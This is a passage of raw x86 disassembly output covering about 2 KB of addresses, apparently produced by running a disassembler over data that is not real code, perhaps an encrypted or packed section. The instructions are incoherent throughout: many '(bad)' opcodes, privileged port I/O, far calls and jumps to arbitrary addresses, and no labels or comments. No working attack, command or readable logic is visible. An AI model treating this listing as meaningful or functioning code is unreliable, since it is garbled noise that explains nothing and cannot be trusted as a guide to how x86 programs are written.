  4040f7:	mov    dl,0xba
  4040f9:	sub    cl,BYTE PTR [edi+ecx*2-0x66]
  4040fd:	add    ch,al
  4040ff:	dec    ebx
  404100:	xor    DWORD PTR [edi+0x47],esp
  404103:	repz call 0x3a063c5c
  404109:	dec    ecx
  40410a:	out    0x4d,al
  40410c:	mov    al,ds:0xa42fe950
  404111:	adc    DWORD PTR [ecx+0x5b04ae37],edx
  404117:	push   ds
  404118:	shr    DWORD PTR [esi],cl
  40411a:	aam    0x91
  40411c:	sbb    BYTE PTR [eax+0x460eddd9],cl
  404122:	leave  
  404123:	push   ebx
  404124:	cs push ebx
  404126:	retf   0xab49
  404129:	sub    bl,BYTE PTR [edi+0x173028e2]
  40412f:	jl     0x4041a6
  404131:	jp     0x404101
  404133:	aas    
  404134:	or     ch,dh
  404136:	cmp    cl,BYTE PTR [edx+0x64cf2ea5]
  40413c:	les    edi,FWORD PTR [edi+edi*2]
  40413f:	dec    eax
  404140:	pop    ecx
  404141:	adc    ah,BYTE PTR [edi]
  404143:	mov    eax,ds:0x5745c42a
  404148:	or     ebx,DWORD PTR [edi-0x32c01bb6]
  40414e:	jmp    0x6ab43dea
  404153:	enter  0xe056,0x34
  404157:	jae    0x40415c
  404159:	or     bh,bh
  40415b:	iret   
  40415c:	pop    edx
  40415d:	inc    ebp
  40415e:	mov    dh,0x9b
  404160:	adc    eax,0xed12da97
  404165:	cmp    edi,DWORD PTR [ecx]
  404167:	ret    
  404168:	and    BYTE PTR [ebp-0x2f175633],ah
  40416e:	popa   
  40416f:	fwait
  404170:	(bad)  
  404171:	aaa    
  404172:	cmp    eax,0x9510da04
  404177:	pop    esp
  404178:	or     DWORD PTR [edx+ebx*8],ecx
  40417b:	push   0x1f
  40417d:	pushf  
  40417e:	cmp    eax,0xfabbdbeb
  404183:	call   0x1f78:0x11727a83
  40418a:	int    0xbf
  40418c:	mov    bh,0xe9
  40418e:	rcl    DWORD PTR [ebp-0x224cc516],cl
  404194:	loope  0x4041fb
  404196:	rol    ecx,0x8a
  404199:	test   eax,0x13fe2bae
  40419e:	xor    ch,al
  4041a0:	cmp    DWORD PTR [ecx-0x27f2afd9],edi
  4041a6:	arpl   sp,ax
  4041a8:	fwait
  4041a9:	push   ss
  4041aa:	icebp  
  4041ab:	into   
  4041ac:	ja     0x404199
  4041ae:	adc    ch,cl
  4041b0:	mov    cl,0xf7
  4041b2:	or     al,0x8f
  4041b4:	popa   
  4041b5:	int3   
  4041b6:	out    dx,eax
  4041b7:	add    DWORD PTR [esi-0x71],edx
  4041ba:	push   eax
  4041bb:	dec    ecx
  4041bc:	and    dl,BYTE PTR [edx-0x6c]
  4041bf:	inc    ecx
  4041c0:	inc    eax
  4041c1:	xchg   ecx,eax
  4041c2:	xchg   DWORD PTR [eax],ebp
  4041c4:	cmp    eax,0x9735f879
  4041c9:	add    al,0x58
  4041cb:	push   edi
  4041cc:	sbb    DWORD PTR [edx-0x19],eax
  4041cf:	sub    al,0x2c
  4041d1:	leave  
  4041d2:	imul   ebx,DWORD PTR [ecx-0x65],0xffffff91
  4041d6:	lea    ebp,[edi+0xa77274f]
  4041dc:	and    BYTE PTR [esi+0x491ef557],cl
  4041e2:	jge    0x404250
  4041e4:	xor    al,0x4c
  4041e6:	and    DWORD PTR [ebp+0x2],ebp
  4041e9:	pop    esp
  4041ea:	push   edx
  4041eb:	retf   
  4041ec:	adc    bl,dl
  4041ee:	nop
  4041ef:	jno    0x4041fa
  4041f1:	es call 0x514568f2
  4041f7:	int3   
  4041f8:	leave  
  4041f9:	scas   eax,DWORD PTR es:[edi]
  4041fa:	pusha  
  4041fb:	inc    ebp
  4041fc:	sar    DWORD PTR [edi],cl
  4041fe:	ror    DWORD PTR [edi-0x10213239],0xfd
  404205:	fwait
  404206:	ror    DWORD PTR [esp+ebp*4-0x32],cl
  40420a:	fadd   QWORD PTR [esi]
  40420c:	loop   0x40423b
  40420e:	aas    
  40420f:	push   ecx
  404210:	or     BYTE PTR [esi],cl
  404212:	pop    esi
  404213:	(bad)  
  404214:	aad    0xfe
  404216:	jmp    0x2732be5c
  40421b:	push   0xeee71aa4
  404220:	loope  0x404234
  404222:	dec    eax
  404223:	and    al,ch
  404225:	mov    esp,0x20d84778
  40422a:	xchg   ecx,eax
  40422b:	call   0xe7224826
  404230:	cmp    DWORD PTR [ecx+0x1d],eax
  404233:	or     BYTE PTR ss:[ebx+ecx*1-0x4c5a5964],0xd5
  40423c:	mov    ebp,0x2889fc98
  404241:	test   eax,0xba718038
  404246:	cmp    ah,BYTE PTR [ebp+0x20]
  404249:	test   eax,0xd0934938
  40424e:	or     edx,DWORD PTR [ecx]
  404250:	sub    dl,bh
  404252:	stos   DWORD PTR es:[edi],eax
  404253:	push   ss
  404254:	sti    
  404255:	mov    bl,0x6
  404257:	loopne 0x4041ef
  404259:	or     DWORD PTR [ebp+0x3d],0x5d
  40425d:	jo     0x40423e
  40425f:	push   ebp
  404260:	in     al,dx
  404261:	cmp    cl,BYTE PTR [ecx]
  404263:	dec    ebx
  404264:	jmp    0x48bd5963
  404269:	lods   eax,DWORD PTR ds:[esi]
  40426a:	xchg   DWORD PTR [ebx+0x32],edi
  40426d:	push   ecx
  40426e:	sub    al,0x9c
  404270:	fcmovu st,st(6)
  404272:	loope  0x4042e1
  404274:	dec    esp
  404275:	inc    edx
  404276:	call   0x5f74837c
  40427b:	xchg   edx,eax
  40427c:	dec    edx
  40427d:	xchg   ebp,eax
  40427e:	dec    esi
  40427f:	jg     0x404279
  404281:	scas   al,BYTE PTR es:[edi]
  404282:	inc    edx
  404283:	push   ebp
  404284:	mov    dh,al
  404286:	or     eax,0x5a12b7cd
  40428b:	dec    esp
  40428c:	push   esi
  40428d:	cmp    eax,DWORD PTR [ebx-0x15]
  404290:	cmp    BYTE PTR [esi+ebp*8+0x1c],bl
  404294:	fwait
  404295:	lahf   
  404296:	(bad)  
  404297:	mov    al,0xf0
  404299:	fdiv   DWORD PTR [eax-0x69]
  40429c:	ja     0x404297
  40429e:	jl     0x4042a3
  4042a0:	and    ah,BYTE PTR [eax+0xb]
  4042a3:	and    BYTE PTR ds:0xc7920827,bh
  4042a9:	enter  0xc29d,0x8f
  4042ad:	jl     0x404303
  4042af:	add    BYTE PTR [edi],cl
  4042b1:	scas   eax,DWORD PTR es:[edi]
  4042b2:	call   0x2fb2:0xce09611c
  4042b9:	pop    edx
  4042ba:	cmp    dh,BYTE PTR [edi]
  4042bc:	sbb    BYTE PTR [eax-0x3c],0x31
  4042c0:	pop    eax
  4042c1:	or     BYTE PTR [edi],bl
  4042c3:	fs aas 
  4042c5:	jl     0x4042be
  4042c7:	add    DWORD PTR [eax],0x1a0b9c85
  4042cd:	sbb    BYTE PTR [edx],ah
  4042cf:	push   ecx
  4042d0:	jg     0x4042b0
  4042d2:	push   edx
  4042d3:	test   al,0xa9
  4042d5:	and    esp,ecx
  4042d7:	ins    BYTE PTR es:[edi],dx
  4042d8:	mov    dh,0x60
  4042da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4042db:	push   ss
  4042dc:	mov    bl,dl
  4042de:	(bad)  
  4042df:	fldcw  WORD PTR [ebp+edx*8-0x6d07e501]
  4042e6:	das    
  4042e7:	pop    ss
  4042e8:	mov    bh,BYTE PTR [edx+0x4]
  4042eb:	xor    BYTE PTR [ebx+eax*2+0x14],dh
  4042ef:	and    BYTE PTR [ebp+0x42],cl
  4042f2:	adc    bl,0xc4
  4042f5:	push   ecx
  4042f6:	mov    DWORD PTR es:[edi],eax
  4042f9:	xchg   BYTE PTR [ebx],al
  4042fb:	sbb    eax,0xe1771982
  404300:	lods   eax,DWORD PTR ds:[esi]
  404301:	rcl    DWORD PTR [ebp+ebx*1+0x33],cl
  404305:	into   
  404306:	test   al,0xed
  404308:	inc    ebx
  40430a:	sub    DWORD PTR [edi-0x34a78a05],ecx
  404310:	fnstsw WORD PTR [ebp+0xa]
  404313:	mov    bh,0x97
  404315:	adc    al,ch
  404317:	mov    dl,0xe4
  404319:	jmp    0x404323
  40431b:	hlt    
  40431c:	test   BYTE PTR [esi-0x10a200fa],al
  404322:	mov    ch,0xca
  404324:	push   esi
  404325:	jne    0x40438d
  404327:	push   ss
  404328:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404329:	add    eax,0x8a65ff94
  40432e:	sbb    BYTE PTR [ebp+0x3b63878d],dh
  404334:	aad    0x71
  404336:	jbe    0x4043a3
  404338:	or     ah,BYTE PTR [ebp+0x3dfa9b4e]
  40433e:	mov    eax,ds:0x168c4f8b
  404343:	jns    0x4042cf
  404345:	and    eax,0x5c6142ec
  40434a:	sub    eax,0x99f0a8d2
  40434f:	loope  0x40434c
  404351:	fdiv   QWORD PTR [edx]
  404353:	adc    al,0x5f
  404355:	mov    edi,0x38640908
  40435a:	or     BYTE PTR [ebp+0x44],cl
  40435d:	jo     0x4043cd
  40435f:	clc    
  404360:	test   BYTE PTR [ebx+0x558f60c7],bh
  404366:	inc    esp
  404367:	sub    ecx,DWORD PTR [ebx+edi*8]
  40436a:	or     esi,0x4462d623
  404370:	sub    BYTE PTR [ebx],cl
  404372:	(bad)  
  404373:	sbb    edx,edx
  404375:	imul   eax,DWORD PTR [edx],0xc5bb78b0
  40437b:	call   0xd4f3:0x69e87633
  404382:	out    0xb4,eax
  404384:	push   ecx
  404385:	xor    ch,BYTE PTR [ecx+0x602d3fd8]
  40438b:	cld    
  40438c:	dec    esi
  40438d:	arpl   di,dx
  40438f:	stos   DWORD PTR es:[edi],eax
  404390:	lahf   
  404391:	sbb    al,0x66
  404393:	dec    ecx
  404394:	pusha  
  404395:	cmp    bh,BYTE PTR [edi-0x61]
  404398:	lea    ebp,[esi+0x2b]
  40439b:	xor    ch,ah
  40439d:	mov    bl,0x88
  40439f:	imul   edi,DWORD PTR [ecx+0x3b],0xa52d9129
  4043a6:	xor    ecx,edx
  4043a8:	call   edx
  4043aa:	scas   al,BYTE PTR es:[edi]
  4043ab:	lahf   
  4043ac:	pusha  
  4043ad:	pop    edi
  4043ae:	jns    0x4043bf
  4043b0:	scas   al,BYTE PTR es:[edi]
  4043b1:	xacquire xchg BYTE PTR [edx+eiz*1],bh
  4043b5:	(bad)  
  4043b6:	out    dx,al
  4043b7:	dec    edx
  4043b8:	mov    DWORD PTR ds:0x8c8c4de,edi
  4043be:	cwde   
  4043bf:	mov    ebx,0xf95d628d
  4043c4:	dec    eax
  4043c5:	pusha  
  4043c6:	push   edi
  4043c7:	xchg   esi,eax
  4043c8:	mov    eax,0xd812807c
  4043cd:	iret   
  4043ce:	shl    BYTE PTR [esi+0x5fbaacea],cl
  4043d4:	jmp    0x7c1d9caf
  4043d9:	ret    
  4043da:	adc    al,BYTE PTR [ebx]
  4043dc:	(bad)  
  4043dd:	lea    edx,[edi-0x6338e730]
  4043e3:	retf   
  4043e4:	push   eax
  4043e5:	sar    BYTE PTR [esi],0xff
  4043e8:	mov    ch,0x11
  4043ea:	aas    
  4043eb:	and    eax,0xe52bd69a
  4043f0:	mov    ecx,0x426a194e
  4043f5:	or     ecx,esp
  4043f7:	push   cs
  4043f8:	xchg   esp,eax
  4043f9:	(bad)  
  4043fa:	in     al,0x81
  4043fc:	and    eax,0x3cbff238
  404401:	jb     0x2dcc565f
  404407:	ret    0x1893
  40440a:	pop    ebx
  40440b:	sub    eax,0xd8a3ca1b
  404410:	and    BYTE PTR [ecx],0xa4
  404413:	sub    ah,dl
  404415:	or     BYTE PTR [eax],bl
  404417:	adc    edi,edi
  404419:	inc    edx
  40441a:	dec    edx
  40441b:	cdq    
  40441c:	les    esi,FWORD PTR [eax]
  40441e:	sub    eax,0x91fd381b
  404423:	jmp    0x4043b3
  404425:	clc    
  404426:	or     bl,bh
  404428:	ja     0x404442
  40442a:	lock jg 0x4043e2
  40442d:	inc    edi
  40442e:	loopne 0x404480
  404430:	jle    0x40444d
  404432:	(bad)  
  404434:	push   cs
  404435:	loop   0x404401
  404437:	icebp  
  404438:	in     al,0x46
  40443a:	aas    
  40443b:	jmp    0x980e:0xc8b3d735
  404442:	imul   esp,DWORD PTR [ebx],0x4cb0c1f1
  404448:	sbb    ecx,edi
  40444a:	xchg   esp,eax
  40444b:	sar    BYTE PTR [ebp-0x27],cl
  40444e:	sub    ecx,DWORD PTR [esi-0x28]
  404451:	aaa    
  404452:	aam    0x91
  404454:	inc    ebp
  404455:	mov    esp,0x9d377726
  40445a:	dec    ebp
  40445b:	cdq    
  40445c:	and    BYTE PTR [ecx+0x1836fa36],dh
  404462:	cmp    BYTE PTR [edx-0x4b],dh
  404465:	in     eax,dx
  404466:	lods   eax,DWORD PTR ds:[esi]
  404467:	inc    edi
  404468:	inc    ebp
  404469:	jne    0x404458
  40446b:	mov    ?,WORD PTR [edx-0x7b]
  40446e:	(bad)  
  40446f:	test   DWORD PTR [edi*4-0x159e62a3],0xadad68ad
  40447a:	out    dx,eax
  40447b:	jp     0x404477
  40447d:	js     0x40447d
  40447f:	addr16 mov esi,ebp
  404482:	and    dl,BYTE PTR [ebx]
  404484:	push   0xb1403aab
  404489:	xor    edx,edx
  40448b:	imul   esi,DWORD PTR [esi-0x19041e59],0x1
  404492:	data16 mov ?,WORD PTR [esi-0xc1e8f93]
  404499:	sbb    DWORD PTR [edx+ebx*1],eax
  40449c:	fsub   st,st(4)
  40449e:	sar    DWORD PTR [edi],1
  4044a0:	lods   al,BYTE PTR ds:[esi]
  4044a1:	pop    ebx
  4044a2:	cdq    
  4044a3:	js     0x4044c5
  4044a5:	dec    ecx
  4044a6:	nop
  4044a7:	mov    cs,WORD PTR [ebx+eax*2]
  4044aa:	ins    BYTE PTR es:[edi],dx
  4044ab:	cmc    
  4044ac:	inc    ebx
  4044ad:	fcom   QWORD PTR [ebx-0x2c]
  4044b0:	fidivr DWORD PTR [ebp+0x22d57988]
  4044b6:	mov    ecx,0x581f5017
  4044bb:	inc    ecx
  4044bc:	ror    BYTE PTR [ebx],1
  4044be:	mov    bl,0x3c
  4044c0:	sub    esi,DWORD PTR [ecx+esi*1]
  4044c3:	dec    edx
  4044c4:	mov    esi,0x11cb3022
  4044c9:	push   ebx
  4044ca:	xchg   DWORD PTR [edx+0x496b721a],eax
  4044d0:	mov    ah,0xdf
  4044d2:	mov    dh,0x84
  4044d4:	out    0xf5,al
  4044d6:	push   esp
  4044d7:	inc    eax
  4044d8:	xchg   edx,eax
  4044d9:	int    0xb3
  4044db:	(bad)  
  4044dc:	jmp    0x10e36ab
  4044e1:	push   ds
  4044e2:	in     al,0xf
  4044e4:	adc    al,0x87
  4044e6:	dec    ebp
  4044e7:	test   eax,0x94f8010e
  4044ec:	push   esi
  4044ed:	dec    ebp
  4044ee:	inc    ebx
  4044ef:	mov    ah,0x1d
  4044f1:	or     al,0xb7
  4044f3:	pop    ds
  4044f4:	stos   BYTE PTR es:[edi],al
  4044f5:	adc    cl,bl
  4044f7:	push   ss
  4044f8:	ret    0x71e9
  4044fb:	sbb    eax,0x866da800
  404500:	lea    edx,[edi+0x29901955]
  404506:	in     eax,dx
  404507:	dec    esp
  404508:	xor    eax,0x86dbeacb
  40450d:	das    
  40450e:	mov    ch,0xd6
  404510:	mov    dl,0xf7
  404512:	cs ret 
  404514:	(bad)  
  404515:	std    
  404516:	inc    eax
  404517:	inc    edx
  404518:	inc    ebp
  404519:	ret    0x6b47
  40451c:	inc    edi
  40451d:	xlat   BYTE PTR ds:[ebx]
  40451e:	scas   al,BYTE PTR es:[edi]
  40451f:	cmp    DWORD PTR [ebp-0x21],edx
  404522:	or     eax,0x47f600be
  404527:	loope  0x40454d
  404529:	mov    dl,BYTE PTR [ecx+esi*2+0x5d]
  40452d:	out    dx,al
  40452e:	test   al,0x49
  404530:	jne    0x40456f
  404532:	retf   0xf9ff
  404535:	inc    esp
  404536:	add    al,BYTE PTR [ebp+0x384d9eba]
  40453c:	ja     0x404512
  40453e:	fcom   QWORD PTR [esi+ecx*1]
  404541:	jbe    0x40456f
  404543:	push   eax
  404544:	int    0x93
  404546:	xchg   esp,eax
  404547:	mov    edi,0x11ac247c
  40454c:	mov    dh,0x6f
  40454e:	jge    0x4044ea
  404550:	lods   eax,DWORD PTR ds:[esi]
  404551:	rol    BYTE PTR [edx+0x15],0xe8
  404555:	sbb    eax,0xadfa2277
  40455a:	in     al,dx
  40455b:	adc    DWORD PTR [ebx+eiz*1-0x3944fe40],eax
  404562:	pop    esi
  404563:	inc    eax
  404564:	out    0x7a,eax
  404566:	xchg   edx,eax
  404567:	jno    0x404514
  404569:	pop    eax
  40456a:	das    
  40456b:	out    dx,al
  40456c:	jns    0x4044f5
  40456e:	cld    
  40456f:	or     dl,dh
  404571:	push   ebp
  404572:	shr    bl,0x8f
  404575:	fs push edi
  404577:	and    DWORD PTR [esi+ebx*4-0x10],esp
  40457b:	adc    al,0x8e
  40457d:	push   esp
  40457e:	jg     0x40455d
  404580:	xor    esi,DWORD PTR [eax-0x5ad903c8]
  404586:	mov    ch,0xe1
  404588:	sub    DWORD PTR [esi],ebp
  40458a:	pop    ds
  40458b:	inc    edi
  40458c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40458d:	mov    ah,0x8a
  40458f:	aad    0xc4
  404591:	ss (bad) 
  404593:	enter  0xfca,0x54
  404597:	sti    
  404598:	jp     0x404599
  40459a:	test   DWORD PTR [eax+ecx*2+0x5b],ecx
  40459e:	iret   
  40459f:	sar    ebx,1
  4045a1:	inc    eax
  4045a2:	popf   
  4045a3:	aad    0xca
  4045a5:	and    BYTE PTR [ecx],bh
  4045a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045a8:	xchg   ecx,eax
  4045aa:	add    DWORD PTR [ebx-0x5d4dfebd],esi
  4045b0:	xor    eax,0x7a4e5d9f
  4045b5:	mov    ds:0xb5c57521,al
  4045ba:	mov    eax,ds:0x8f654898
  4045bf:	pop    esp
  4045c0:	adc    cl,BYTE PTR [edx-0x77]
  4045c3:	pushf  
  4045c4:	out    0xc0,al
  4045c6:	dec    BYTE PTR [eax]
  4045c8:	mov    ds:0xca4b458f,al
  4045cd:	push   esp
  4045ce:	dec    ecx
  4045cf:	cmp    edx,DWORD PTR [ecx+0x33]
  4045d2:	in     al,dx
  4045d3:	and    esp,DWORD PTR [esi-0x24]
  4045d6:	jae    0x4045b6
  4045d8:	fst    QWORD PTR [edi+0x7e44ff07]
  4045de:	mov    ds:0x2c0bf7ac,al
  4045e3:	inc    edx
  4045e4:	dec    edx
  4045e5:	xor    BYTE PTR [edx-0x3c],bh
  4045e8:	mov    ds,WORD PTR [ecx-0x48]
  4045eb:	out    dx,eax
  4045ec:	lds    edi,FWORD PTR [ebx+0x5250cc5e]
  4045f2:	shl    BYTE PTR [edx-0x70],0xec
  4045f6:	xor    al,0xa3
  4045f8:	sbb    al,cl
  4045fa:	mov    cl,0xd7
  4045fc:	cld    
  4045fd:	out    0x5f,eax
  4045ff:	adc    edx,esp
  404601:	mov    ds:0xd5cdf8c,eax
  404606:	jmp    0x813adaea
  40460b:	jo     0x4045d1
  40460d:	and    ecx,edi
  40460f:	cpuid  
  404611:	enter  0x32cf,0x7
  404615:	test   BYTE PTR [ebp+0x1c7d5bf7],dh
  40461b:	outs   dx,DWORD PTR ds:[esi]
  40461c:	mov    esp,0x19190b74
  404621:	cmp    DWORD PTR [ebp+esi*1-0x3ff42eeb],edi
  404628:	cld    
  404629:	xor    bh,BYTE PTR [edx+0x52]
  40462c:	fcmovu st,st(6)
  40462e:	out    0x9d,eax
  404630:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404631:	daa    
  404632:	adc    edi,DWORD PTR [esi-0x3b7e083a]
  404638:	jge    0x404656
  40463a:	add    esi,DWORD PTR [ebp+0x48]
  40463d:	push   edx
  40463e:	mov    WORD PTR [ebx],?
  404640:	mov    bh,0x13
  404642:	jecxz  0x4045ed
  404644:	jbe    0x4045e2
  404646:	icebp  
  404647:	inc    edi
  404648:	cmp    DWORD PTR [esi],0x1447a4c2
  40464e:	adc    BYTE PTR [esi],ch
  404650:	dec    esp
  404651:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404652:	ret    
  404653:	inc    ecx
  404654:	out    0x58,al
  404656:	xor    bh,BYTE PTR [ebx]
  404658:	retf   
  404659:	dec    ecx
  40465a:	mov    ah,0x98
  40465c:	jne    0x404653
  40465e:	mov    al,BYTE PTR [edi+0x1c]
  404661:	add    DWORD PTR [eax],edx
  404663:	out    dx,eax
  404664:	in     eax,dx
  404665:	ds jg  0x4046c5
  404668:	cmp    DWORD PTR [eax+0x2ba5f75d],ebp
  40466e:	sbb    BYTE PTR [edi-0x6a],bl
  404671:	mov    al,0x6e
  404673:	test   BYTE PTR [edi+0x1d],0xb0
  404677:	jne    0x404694
  404679:	clc    
  40467a:	push   esi
  40467b:	inc    edx
  40467c:	xchg   edi,eax
  40467d:	push   esp
  40467e:	pop    esp
  40467f:	retf   0x7389
  404682:	jmp    0x404671
  404684:	repnz in al,0xe6
  404687:	xchg   esp,eax
  404688:	and    esp,ecx
  40468a:	(bad)  
  40468b:	fisubr WORD PTR [edi+eiz*2+0x58baf289]
  404692:	shl    BYTE PTR [esi+ebx*1],1
  404695:	adc    ebx,DWORD PTR [edx]
  404697:	test   eax,0x920c27d8
  40469c:	jnp    0x404705
  40469e:	nop
  40469f:	inc    ecx
  4046a0:	mov    ch,BYTE PTR es:[edi+0x7e325886]
  4046a7:	mov    al,ds:0x9c54f0ac
  4046ac:	fs mov bh,0x25
  4046af:	jmp    0x40467b
  4046b1:	inc    ecx
  4046b2:	xor    eax,0xcb27792f
  4046b7:	jge    0x404717
  4046b9:	jmp    0xf4b2342f
  4046be:	test   al,0x60
  4046c0:	mov    edx,0x6ad5765e
  4046c5:	pop    edi
  4046c6:	cs mov edx,0x3f9a4353
  4046cc:	call   0xbe9e:0xeca2ff12
  4046d3:	stos   DWORD PTR es:[edi],eax
  4046d4:	lods   al,BYTE PTR ds:[esi]
  4046d5:	adc    DWORD PTR [edx-0x30],edx
  4046d8:	shl    DWORD PTR [edi],1
  4046da:	aad    0x6a
  4046dc:	mov    ah,0x64
  4046de:	pop    ecx
  4046df:	push   esi
  4046e0:	xor    esp,eax
  4046e2:	or     esi,DWORD PTR [edx+0x2505b1b]
  4046e8:	shl    DWORD PTR [edi-0x22f4a972],1
  4046ee:	je     0x4046e0
  4046f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046f1:	mov    edx,0x8adf6b22
  4046f6:	push   edx
  4046f7:	arpl   di,dx
  4046f9:	ret    0x5a8
  4046fc:	xor    eax,0x4b4780fc
  404701:	ss inc ebp
  404703:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404704:	jo     0x404718
  404706:	xlat   BYTE PTR ds:[ebx]
  404707:	pop    ecx
  404708:	inc    ebp
  404709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40470a:	mov    esi,edi
  40470c:	pop    DWORD PTR [esi-0x29]
  40470f:	mov    ebx,0x6a9241d4
  404714:	push   cs
  404715:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404716:	icebp  
  404717:	and    al,0x77
  404719:	mov    ds:0x71924cb6,al
  40471e:	hlt    
  40471f:	test   BYTE PTR [edi+0x6107e46a],ch
  404725:	(bad)  
  404726:	cmp    al,0x8c
  404728:	stc    
  404729:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40472a:	outs   dx,DWORD PTR ds:[esi]
  40472b:	sahf   
  40472c:	sub    edi,eax
  40472e:	pop    ecx
  40472f:	cli    
  404730:	jmp    0xc594:0x409db915
  404737:	sub    esi,DWORD PTR [ebx-0x73]
  40473a:	lock pop ss
  40473c:	enter  0x8b73,0xe3
  404740:	xchg   edx,eax
  404741:	pop    edx
  404742:	and    BYTE PTR [edx],ch
  404744:	out    dx,al
  404745:	mov    DWORD PTR [ebx-0x7577b05],0xccbb6a19
  40474f:	jne    0x404737
  404751:	jg     0x4047a2
  404753:	push   es
  404754:	adc    edi,DWORD PTR [ecx]
  404756:	sbb    al,0xbf
  404758:	mov    WORD PTR [ecx+0x51],?
  40475b:	aam    0xa5
  40475d:	and    eax,DWORD PTR ds:[ebx+0x64]
  404761:	mov    al,0x88
  404763:	cmovb  ebp,DWORD PTR [edi-0xc]
  404767:	cmp    DWORD PTR [eax-0x4a],edi
  40476a:	push   ebx
  40476b:	outs   dx,BYTE PTR ds:[esi]
  40476c:	push   ds
  40476d:	sbb    DWORD PTR [esi+0x60f9fe98],edi
  404773:	and    bh,BYTE PTR [ebx]
  404775:	loop   0x4047cd
  404777:	ror    DWORD PTR [esi-0x563f19d6],cl
  40477d:	loope  0x404754
  40477f:	and    al,0xa2
  404781:	dec    edi
  404782:	add    BYTE PTR [ebp-0x4a],dl
  404785:	nop
  404786:	ret    0x1acf
  404789:	adc    DWORD PTR [eax+0x1b],ebx
  40478c:	les    edi,FWORD PTR [eax]
  40478e:	xor    al,0xf7
  404790:	fcom   DWORD PTR [ebp+0x59]
  404793:	fdivr  QWORD PTR [ebx-0x72]
  404796:	push   edi
  404797:	and    eax,0x69bebee7
  40479c:	inc    esp
  40479d:	ins    BYTE PTR es:[edi],dx
  40479e:	xlat   BYTE PTR ds:[ebx]
  40479f:	cli    
  4047a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047a1:	mov    bh,0x42
  4047a3:	movhlps xmm6,xmm5
  4047a6:	jae    0x404748
  4047a8:	inc    eax
  4047a9:	and    DWORD PTR [edi+0x5ad869c3],eax
  4047af:	cmp    al,0xbb
  4047b1:	(bad)  
  4047b2:	pop    ebx
  4047b3:	adc    dh,BYTE PTR [esi+eiz*4-0x33]
  4047b7:	je     0x4047fd
  4047b9:	js     0x4047e3
  4047bb:	inc    eax
  4047bc:	(bad)  
  4047bd:	mov    dh,0xf3
  4047bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4047c0:	xor    eax,edi
  4047c2:	(bad)  
  4047c3:	out    dx,al
  4047c4:	mov    esi,0xeeda98d9
  4047c9:	and    BYTE PTR [eax+0x65],bl
  4047cc:	pop    eax
  4047cd:	xor    eax,0x1b685a70
  4047d2:	int    0x77
  4047d4:	mov    esi,0x38b3c87a
  4047d9:	xchg   ecx,eax
  4047da:	cmp    al,0x56
  4047dc:	cmp    eax,0xfb7764ac
  4047e1:	mov    bh,0xdd
  4047e3:	mov    ds:0xfbe75a17,eax
  4047e8:	leave  
  4047e9:	push   edx
  4047ea:	lock call 0xa8187f17
  4047f0:	or     al,0x45
  4047f2:	fwait
  4047f3:	mov    WORD PTR [edx+0x4d45137d],es
  4047f9:	out    0xa8,al
  4047fb:	popf   
  4047fc:	jbe    0x4047c0
  4047fe:	sbb    ecx,esp
  404800:	jns    0x40486a
  404802:	shr    BYTE PTR [edi+0xfdc8826],1
  404808:	lods   al,BYTE PTR ds:[esi]
  404809:	xchg   BYTE PTR [ebp+0x6c],bl
  40480c:	or     ebp,ecx
  40480e:	xchg   esi,eax
  40480f:	or     dh,BYTE PTR [ecx-0x34]
  404812:	adc    BYTE PTR [eax+ecx*1-0x7ab1ab59],bl
  404819:	sub    BYTE PTR [esi+0x6a2fb99f],dl
  40481f:	div    BYTE PTR [ebp-0x155acbec]
  404825:	mov    ?,WORD PTR [ebx+0x79]
  404828:	xchg   edi,eax
  404829:	outs   dx,DWORD PTR ds:[esi]
  40482a:	push   cs
  40482b:	ss sub ah,0x14
  40482f:	inc    esi
  404830:	js     0x4048a5
  404832:	cmp    DWORD PTR [ebx+0x9],esp
  404835:	add    BYTE PTR [ecx-0x37],cl
  404838:	sub    DWORD PTR [eax+0x7a150bf0],edx
  40483e:	std    
  40483f:	sub    al,0xf4
  404841:	shl    BYTE PTR [esi],1
  404843:	mov    al,ds:0x3b60a169
  404848:	sti    
  404849:	popf   
  40484a:	sbb    al,0x97
  40484c:	add    BYTE PTR [edi+0x185d07db],0x88
  404853:	xor    BYTE PTR [edi-0x72],dh
  404856:	retf   
  404857:	mov    al,ds:0xea7573d0
  40485c:	mov    bh,0x70
  40485e:	and    ebx,eax
  404860:	mov    ah,0xd8
  404862:	jl     0x40489b
  404864:	out    0x4b,al
  404866:	dec    edx
  404867:	pusha  
  404868:	adc    eax,0x5ef25468
  40486d:	lock mov ah,0xfb
  404870:	retf   
  404871:	retf   
  404872:	push   0x55c7e807
  404877:	imul   ecx,DWORD PTR [ecx],0x4
  40487a:	bswap  ebp
  40487c:	retf   
  40487d:	jp     0x4048fb
  40487f:	lds    ecx,FWORD PTR [edi]
  404881:	fimul  DWORD PTR [eax]
  404883:	pop    esp
  404884:	jb     0x40483f
  404886:	sbb    eax,0x4989e477
  40488b:	cmp    edi,ebx
  40488d:	test   BYTE PTR [ebp-0x2b],al
  404890:	je     0x404831
  404892:	pop    edi
  404893:	jg     0x40486a
  404895:	or     cl,cl
  404897:	sub    eax,0x1b2b7fbe
  40489c:	adc    al,0x7c
  40489e:	out    dx,eax
  40489f:	addr16 pop ss
  4048a1:	aaa    
  4048a2:	out    0x87,al
  4048a4:	test   esp,0xf6725ecc
  4048aa:	lahf   
  4048ab:	pop    esp
  4048ac:	push   edi
  4048ad:	mov    cl,BYTE PTR [ecx]
  4048af:	les    ebx,FWORD PTR [esi]
  4048b1:	and    esp,DWORD PTR [eax]
  4048b3:	jl     0x4048c9
  4048b5:	test   al,0xd7
  4048b7:	cdq    
  4048b8:	cmp    esi,DWORD PTR [eax]
  4048ba:	mov    DWORD PTR [ebx+0x2c202306],esp
  4048c0:	cdq    
  4048c1:	retf   0x33eb
  4048c4:	pop    eax
  4048c5:	out    dx,eax
